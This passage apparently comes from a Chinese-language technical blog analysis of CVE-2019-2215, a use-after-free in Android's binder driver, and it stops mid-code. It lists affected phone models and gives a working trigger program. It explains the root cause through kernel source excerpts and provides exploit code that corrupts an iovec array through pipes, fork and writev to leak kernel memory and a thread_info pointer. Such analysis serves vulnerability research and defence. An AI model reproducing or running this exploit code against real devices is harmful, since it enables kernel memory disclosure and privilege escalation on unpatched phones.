class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>漏洞编号：</strong>CVE-2019-2215</p><p><strong>漏洞危害等级：</strong></p><p><strong>复现&#x2F;利用难易程度：</strong></p><ul><li><p><strong>适用环境：</strong></p><p>  1)Pixel 2 小于 Android 10</p><ol start="2"><li><p>Huawei P20</p></li><li><p>Xiaomi Redmi 5A</p></li><li><p>Xiaomi Redmi Note 5</p></li><li><p>Xiaomi A1</p></li><li><p>Oppo A3</p></li><li><p>Moto Z3</p></li><li><p>Oreo LG phones (run same kernel according to website)</p></li><li><p>Samsung S7, S8, S9</p></li></ol></li></ul><p><strong>漏洞类型：Use-after-Free</strong></p><ul><li><p><strong>触发方式：</strong></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> fd, epfd;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class="line"> fd = open(<span class="string">&quot;/dev/binder&quot;</span>, O_RDONLY);<span class="comment">//创建binder_thread</span></span><br><span class="line"> epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line"> epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);<span class="comment">//初始化binder_thread-&gt;wait_queue_head_t, 调用add_wait_queue插入wait_queue_t到binder_thread.wait中</span></span><br><span class="line"> ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);<span class="comment">//释放binder_thread结构体，程序结束的时会遍历这个链表触发uaf</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>利用条件：</strong></p><p>  使用管道作为泄漏的媒介。攻击策略基本上如下：</p><p>  1.创建管道</p><p>  2.在binder_thread对象上触发free</p><p>  3.在管道上调用writev函数</p><p>  4.触发UAF&#x2F;unlink破坏iovec结构</p><p>  5.在管道上调用read函数，它将使用IOVEC_INDX_FOR_WQ处未被覆写的iovec读取dummy_page</p><p>  数据</p><p>  6.在管道上再次调用read函数，它将使用IOVEC_INDX_FOR_WQ+1处被覆写的iovec读取内核数据</p><p>  在两个单独的线程中处理读取和写入更容易。</p><p>  父线程负责：</p><p>  1.在binder_thread对象上触发free</p><p>  2.在管道上调用writev函数</p><p>  3.(等待子线程)</p><p>  4.在管道上再次调用read函数，它将使用IOVEC_INDX_FOR_WQ+1处被覆写的iovec读取内核数据</p><p>  子线程负责：</p><p>  (接父线程中的第2步)</p><p>  1.触发UAF&#x2F;unlink破坏iovec结构</p><p>  2.在管道上调用read函数，它将使用IOVEC_INDX_FOR_WQ处未被覆写的iovec读取dummy_page数据</p></li></ul><h2 id="成因分析："><a href="#成因分析：" class="headerlink" title="成因分析："></a><strong>成因分析：</strong></h2><h3 id="binder"><a href="#binder" class="headerlink" title="binder"></a><strong>binder</strong></h3><p>binder驱动程序是用于android的驱动程序，它提供了一种简单的IPC(Inter Process Communication，进程间通信)方法，包括RPC(Remote Procedure Calling，远程过程调用)。您可以在linux内核中找到此驱动程序的源代码。binder设备驱动程序可用于不同类型的IPC。例如使用AIDL(Android Interface Definition Language，Android接口定义语言)在framework和应用程序进程之间进行通信可以使用&#x2F;dev&#x2F;binder；使用HIDL(HAL Interface Definition Language，硬件抽象层接口定义语言)在framework和应用程序进程之间进行通信可以使用&#x2F;dev&#x2F;hwbinder。对于在供应商进程之间使用IPC而不使用HIDL的供应商，可以使用&#x2F;dev&#x2F;vndbinder。这里主要利用的是第一个驱动程序&#x2F;dev&#x2F;binder。</p><p>与linux中的大多数IPC机制一样，binder通过文件描述符并使用EPOLL API向其添加epoll。</p><h3 id="vectored-I-x2F-O"><a href="#vectored-I-x2F-O" class="headerlink" title="vectored I&#x2F;O"></a><strong><strong>vectored I&#x2F;O</strong></strong></h3><p>vectored I&#x2F;O允许使用多个缓冲区写入数据流，或将数据流读取到多个缓冲区。也称为scatter&#x2F;gather I&#x2F;O(分散&#x2F;聚集 I&#x2F;O)。与non-vectored I&#x2F;O相比，vectored I&#x2F;O具有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销，属于原子操作。当数据包中有一个头部，后跟连续块中的数据的时候使用vectored I&#x2F;O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用对其进行读取或写入。使用方法是定义一个iovec结构体数组，其中包含有关要用于I&#x2F;O的所有缓冲区的信息。该iovec结构体相对较小，在64位系统上仅包含两个QWORD(8字节数据)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>&#123;</span><span class="comment">// Size: 0x10</span></span><br><span class="line"><span class="type">void</span>*iov_base;<span class="comment">// 0x00</span></span><br><span class="line"><span class="type">size_t</span> iov_len;<span class="comment">// 0x08</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="binder-ioctl"><a href="#binder-ioctl" class="headerlink" title="binder_ioctl"></a>binder_ioctl</h2><p>该漏洞触发的点在ioctl命令BINDER_THREAD_EXIT ，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">binder_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">case</span> BINDER_THREAD_EXIT:</span><br><span class="line">        binder_debug(BINDER_DEBUG_THREADS, <span class="string">&quot;%d:%d exit\n&quot;</span>,</span><br><span class="line">                 proc-&gt;pid, thread-&gt;pid);</span><br><span class="line">        binder_free_thread(proc, thread);</span><br><span class="line">        thread = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">binder_free_thread</span><span class="params">(<span class="keyword">struct</span> binder_proc *proc,</span></span><br><span class="line"><span class="params">                  <span class="keyword">struct</span> binder_thread *thread)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">t</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">send_reply</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> active_transactions = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t) &#123;</span><br><span class="line">        active_transactions++;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (send_reply)</span><br><span class="line">        binder_send_failed_reply(send_reply, BR_DEAD_REPLY);</span><br><span class="line">    binder_release_work(&amp;thread-&gt;todo);</span><br><span class="line">    kfree(thread); <span class="comment">// 触发UAF</span></span><br><span class="line">    binder_stats_deleted(BINDER_STAT_THREAD);</span><br><span class="line">    <span class="keyword">return</span> active_transactions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kfree(thread) 是触发UAF漏洞中释放thread的地方。</p><h2 id="ep-unregister-pollwait"><a href="#ep-unregister-pollwait" class="headerlink" title="ep_unregister_pollwait"></a>ep_unregister_pollwait</h2><p>查看源码发现binder_thread对象是间接引用的，被释放的binder_thread在eppoll_entry链表中，即pwq。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ep_unregister_pollwait</span><span class="params">(<span class="keyword">struct</span> eventpoll *ep, <span class="keyword">struct</span> epitem *epi)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lsthead</span> =</span> &amp;epi-&gt;pwqlist;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eppoll_entry</span> *<span class="title">pwq</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!list_empty(lsthead)) &#123;</span><br><span class="line">        pwq = list_first_entry(lsthead, <span class="keyword">struct</span> eppoll_entry, llink);</span><br><span class="line"></span><br><span class="line">        list_del(&amp;pwq-&gt;llink);</span><br><span class="line">        ep_remove_wait_queue(pwq);</span><br><span class="line">        kmem_cache_free(pwq_cache, pwq);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ep-remove-wait-queue"><a href="#ep-remove-wait-queue" class="headerlink" title="ep_remove_wait_queue"></a>ep_remove_wait_queue</h2><p>remove_wait_queue函数的功能就是删除紧随在表头之后的一个成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ep_remove_wait_queue</span><span class="params">(<span class="keyword">struct</span> eppoll_entry *pwq)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> *whead;</span><br><span class="line"></span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    whead = smp_load_acquire(&amp;pwq-&gt;whead);</span><br><span class="line">    <span class="keyword">if</span> (whead)</span><br><span class="line">        remove_wait_queue(whead, &amp;pwq-&gt;wait);</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_wait_queue</span><span class="params">(<span class="type">wait_queue_head_t</span> *q, <span class="type">wait_queue_t</span> *wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">    spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">    __remove_wait_queue(q, wait);</span><br><span class="line">    spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>remove_wait_queue函数中q是waitqueue的表头，指向binder_thread结构体中的wait_queue_head_t(已经被释放)。wait是waitqueue中的成员，紧随在表头之后。结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_proc</span> *<span class="title">proc</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb_node</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">waiting_thread_node</span>;</span></span><br><span class="line">        <span class="type">int</span> pid;</span><br><span class="line">        <span class="type">int</span> looper;              <span class="comment">/* only modified by this thread */</span></span><br><span class="line">        <span class="type">bool</span> looper_need_return; <span class="comment">/* can be written by other thread */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">transaction_stack</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">todo</span>;</span></span><br><span class="line">        <span class="type">bool</span> process_todo;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">return_error</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">reply_error</span>;</span></span><br><span class="line">        <span class="type">wait_queue_head_t</span> wait;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_stats</span> <span class="title">stats</span>;</span></span><br><span class="line">        <span class="type">atomic_t</span> tmp_ref;</span><br><span class="line">        <span class="type">bool</span> is_dead;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span>              lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>        <span class="title">task_list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> <span class="title">wait_queue_head_t</span>;</span></span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以利用链表中的unlink操作来泄露内核数据 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__remove_wait_queue(<span class="type">wait_queue_head_t</span> *head, <span class="type">wait_queue_t</span> *old)</span><br><span class="line">&#123;</span><br><span class="line">    list_del(&amp;old-&gt;task_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">list_del</span><span class="params">(<span class="keyword">struct</span> list_head *entry)</span></span><br><span class="line">&#123;</span><br><span class="line">    __list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">    entry-&gt;next = LIST_POISON1;</span><br><span class="line">    entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __list_del(<span class="keyword">struct</span> list_head * prev, <span class="keyword">struct</span> list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">    next-&gt;prev = prev; <span class="comment">// unlink</span></span><br><span class="line">    WRITE_ONCE(prev-&gt;next, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>iovec结构体的iov_base指针进行泄露，内核将在处理请求之前首先确保iov_base是一个用户态指针，需要将该指针覆盖成unlink中的prev，当iovec从描述符中读取iov_base指向的数据时，将会读取我们覆盖的指针位置，就可以泄露prev指向处的数据，注意其中包含的地址需要拥有允许任意读取&#x2F;写入以及代码执行的权限。iovec结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">ptr_t</span> iov_base; <span class="comment">/* Starting address */</span></span><br><span class="line">    <span class="type">size_t</span> iov_len; <span class="comment">/* Length in bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果要覆盖这个指针就必须找到binder_thread结构的waitqueue的偏移量，查看使用binder_thread结构的waitqueue可以找到偏移量，当函数binder_wakeup_thread_ilocked调用wake_up_interruptible_sync(&amp;thread-&gt;wait) 时，在调用之前将地址加载到X0寄存器中时会引用偏移量。我们可以看到waitqueue位于binder_thread的偏移0xA0处。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000</span>C0E2B4    ADD    X0, X8, #<span class="number">0xA0</span></span><br><span class="line">.text:<span class="number">0000000000</span>C0E2B8    MOV    W1, #<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000</span>C0E2BC    MOV    W2, #<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000</span>C0E2C0    TBZ    W19, #<span class="number">0</span>, loc_C0E2CC</span><br><span class="line">.text:<span class="number">0000000000</span>C0E2C4    BL     __wake_up_sync</span><br></pre></td></tr></table></figure><p>binder_thread结构体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_proc</span> *<span class="title">proc</span>;</span>   <span class="comment">// 线程所属的Binder进程</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb_node</span>;</span>     <span class="comment">// 红黑树节点，关联到红黑树binder_proc-&gt;threads中。</span></span><br><span class="line">    <span class="type">int</span> pid;                    <span class="comment">// 进程id</span></span><br><span class="line">    <span class="type">int</span> looper;                 <span class="comment">// 线程状态。可以取BINDER_LOOPER_STATE_REGISTERED等值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">transaction_stack</span>;</span>   <span class="comment">// 正在处理的事务栈</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">todo</span>;</span>                          <span class="comment">// 待处理的事务链表</span></span><br><span class="line">    <span class="type">uint32_t</span> return_error; <span class="comment">/* Write failed, return error code in read buf */</span></span><br><span class="line">    <span class="type">uint32_t</span> return_error2; <span class="comment">/* Write failed, return error code in read */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">wait_queue_head_t</span> wait;                         <span class="comment">// 等待队列</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_stats</span> <span class="title">stats</span>;</span>                      <span class="comment">// 保存一些统计信息</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于iovec结构体大小为0x10，这意味着数组中的索引0xA处的iovec将与waitqueue对齐。由于自旋锁只有一个DWORD(4个字节)，并且我们可以传递64位的指针，因此可以将mmap映射低32位为0的用户态地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dummy_page = mmap((<span class="type">void</span> *)<span class="number">0x100000000</span>ul, <span class="number">2</span> * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line"><span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned;<span class="comment">// 自旋锁必须为0以避免死锁</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">0x1000</span>; <span class="comment">// wq-&gt;task_list-&gt;next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>;<span class="comment">// wq-&gt;task_list-&gt;prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure><p>构造好之后，首先因为iovec数组的前10都是0所以直接跳过了，然后iovec[10].iov_len和管道的大小一样所以父进程调用writev函数从iovec[10].iov_base读取dummy_page数据到管道导致管道被阻塞，子进程触发UAF&#x2F;unlink破坏iovec结构再读取管道解除了阻塞，这个时候父进程再调用writev函数从iovec[11].iov_base读取内核数据到管道再读取管道。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123;.events = EPOLLIN&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line"><span class="type">char</span> leakBuff[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> byteSent;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))</span><br><span class="line">    exitWithError(<span class="string">&quot;EPOLL_CTL_ADD failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; <span class="comment">// mutex</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">0x1000</span>; <span class="comment">// linked list next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">// linked list prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pipe(pipefd))</span><br><span class="line">    exitWithError(<span class="string">&quot;Pipe failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fcntl(pipefd[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>) != <span class="number">0x1000</span>)</span><br><span class="line">    exitWithError(<span class="string">&quot;F_SETPIPE_SZ failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(pipefd[<span class="number">0</span>], leakBuff, <span class="keyword">sizeof</span>(leakBuff)) != <span class="keyword">sizeof</span>(leakBuff))</span><br><span class="line">        exitWithError(<span class="string">&quot;[CHILD] Read failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">byteSent = writev(pipefd[<span class="number">1</span>], iovec_array, IOVEC_ARRAY_SZ);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(byteSent != <span class="number">0x2000</span>)</span><br><span class="line">    exitWithError(<span class="string">&quot;[PARENT] Leak failed: writev returned %d, expected 0x2000.&quot;</span>, byteSent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(read(pipefd[<span class="number">0</span>], leakBuff, <span class="keyword">sizeof</span>(leakBuff)) != <span class="keyword">sizeof</span>(leakBuff))</span><br><span class="line">    exitWithError(<span class="string">&quot;[PARENT] Read failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">__android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;EXPLOIT&quot;</span>, <span class="string">&quot;leak + 0xE8 = %lx\n&quot;</span>, *(<span class="type">uint64_t</span> *)(leakBuff + <span class="number">0xE8</span>));</span><br><span class="line">thread_info = *(<span class="type">unsigned</span> <span class="type">long</span> *)(leakBuff + <span class="number">0xE8</span>); <span class="comment">//泄露这个结构体</span></span><br></pre></td></tr></table></figure><p>thread_info 结构体的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       flags;      <span class="comment">/* low level flags */</span></span><br><span class="line">    <span class="type">mm_segment_t</span>        addr_limit; <span class="comment">/* address limit */</span></span><br><span class="line">    <span 